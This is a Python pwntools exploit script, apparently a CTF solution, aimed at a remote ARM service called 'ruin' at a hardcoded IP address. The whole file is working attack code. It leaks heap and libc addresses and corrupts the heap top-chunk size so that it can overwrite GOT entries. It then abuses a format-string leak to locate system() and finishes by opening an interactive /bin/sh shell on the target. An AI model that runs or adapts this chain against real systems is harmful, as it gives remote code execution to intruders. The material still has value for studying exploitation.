#!/usr/bin/env python
import os.path
import time
import sys
import select
from subprocess import Popen, PIPE
from pwn import *

# Set architecture: arm i386 amd64 thumb aarch64 mips mips64 sparc sparc64 powerpc powerpc64 ia64
ARCH = 'arm'
# Set OS: linux freebsd
OS = 'linux'
# Set endianness: big little
ENDIAN = 'little'
# Set word size if needed
WORDS = 0
# Set binary path, set to None if unavailable
FN = './ruin'
# Set remote address
IP = '166.111.132.49'
PORT = 9999
# Set target service:
# lhost = localhost:PORT
# lio = communicate with binary through stdio
# rhost = IP:PORT
TARGET = 'rhost'
# Set recvAll params
RECVALL = 4
TIMEOUT = 0.3

connect = ''

def init():
    if WORDS != 0:
        context(arch = ARCH, os = OS, endian = ENDIAN, word_size = WORDS)
    else:
        context(arch = ARCH, os = OS, endian = ENDIAN)

    conn = None
    if TARGET == 'lio':
        conn = process(FN)
        pid = pwnlib.util.proc.pidof('ruin')[0]
        print "pid of ruin ================ : %d" % pid
        print open("/proc/%d/maps" % pid, 'r').read()
    elif TARGET == 'rhost':
        conn = remote(IP, PORT)
    elif TARGET == 'lhost':
        conn = remote('127.0.0.1', PORT)
    else:
        print "Invalid TARGET: " + TARGET
    elf = None
    if FN != None:
        elf = ELF(FN)
    return conn, elf

def waitForGdbAttach():
    print 'waiting (for gdb attach or any keypress)...'

    while 1:
        attachFn = FN + '.attached'
        if os.path.isfile(attachFn):
            os.remove(attachFn)
            break
        time.sleep(0.1)
        if select.select([sys.stdin,],[],[],0.1)[0]:
            break

    print 'gdb attached.'

def recvAll(conn, cnt = RECVALL):
    msg = ""
    for x in range(cnt):
        msg += conn.recv(timeout = TIMEOUT)
    return msg

#### Service API ####
def sendData(c, menu, args):
    c.send(str(menu)+'\n')
    res = ''
    for arg in args:
        res += c.recvuntil(':')
        c.send(arg)
    res += c.recvuntil(':')
    return res

# Used to read libc to find the system call
def leaker(addr):
    sys.stdout.write(hex(addr) + ': ')
    if addr%0x100 == 0:
        print "upppss..."
        if not '000' in '%02x'%(addr + 1):
            testVal = leaker(addr + 1)
            if testVal[0:3] == "ELF":
                return "\x7f" + testVal
            else:
                return leaker(addr - 1)
        else:
            return leaker(addr - 1)
    else:
        connect.send(p32(addr) + "%5$s\n")
        data = connect.recvuntil('\nwrong')[4:-6]
        if data == "":
            data += "\x00"
        print '%r' % data
        dump = connect.recvuntil(':')
        return data

#### Exploit Main ####
if __name__ == "__main__":
    rerun = True
    while (rerun):
        try:
            c, e = init()
            time.sleep(1)
            #waitForGdbAttach()
            #gdb.attach(target, exe = FN, execute = "gdb scriptj")

            ## Leaking Heap Base
            connect = c
            c.recvuntil(":")
            c.send("xxxxxxxx")
            leak = c.recvuntil(':')
            print "Heapbase:" + hexdump(leak[8:12])
            heapbase = u32(leak[8:12]) - 8
            c.send("security")
            c.recvuntil(":")

            ## Setting up wilderness (Last free chunk size)
            LAST_CHUNK_SIZE= "\xff"*4 + "\xff"*4
            FILL="\x00"*8
            sendData(c, 2, ["A"*8+LAST_CHUNK_SIZE+FILL])
            print "Wilderness Set Up"
            c.send('\n')
            c.recvuntil(':')

            ## Align Heap Top to .got atoi
            heap_top = heapbase + 24
            target = e.got['atoi']
            print "atoi: " + hex(target)
            address = target - 8 - heap_top
            print "Chunk size: "+str(address)
            OFFSET_TO_GOT= str(address) + 'A'* (32 -len(str(address)))
            sendData(c, 3, [OFFSET_TO_GOT,"A"*10+"\n"])
            print "Large Chunk Allocated"
            c.recvuntil(':')

            ## Overwrite atoi with printf .plt
            PAYLOAD_ADDR=p32(0x8594)
            sendData(c, 1, [PAYLOAD_ADDR+ "\x00"* (16-len(PAYLOAD_ADDR))])
            print "got overwritten with printf"

            ## Leaking libc addresses
            c.send("%21$p|%22$p/\n")
            libc = c.recvuntil('/')[:-1]
            start = int(libc.split('|')[0], 16)
            segment = int(libc.split('|')[1], 16)
            print hex(start)
            print hex(segment)
            c.recvuntil(':')

            rerun = False

            ## Find the address of system
            d = DynELF(leaker, start)
            system = d.lookup('system')
            print 'system = %r' % system

            #offset = 0 ## This is what we need
            #system = p32(start + offset)
            print "Sending System addr"
            PAYLOAD_ADDR = p32(system)
            sendData(c, "", [PAYLOAD_ADDR+ "\x00"* (16-len(PAYLOAD_ADDR))])
            c.send("/bin/sh\x00")
            c.interactive()

            ## EXIT
            #break
            #sendData(c, 4, [])
            #print "Free Called"

        except (socket.error, EOFError):
            continue
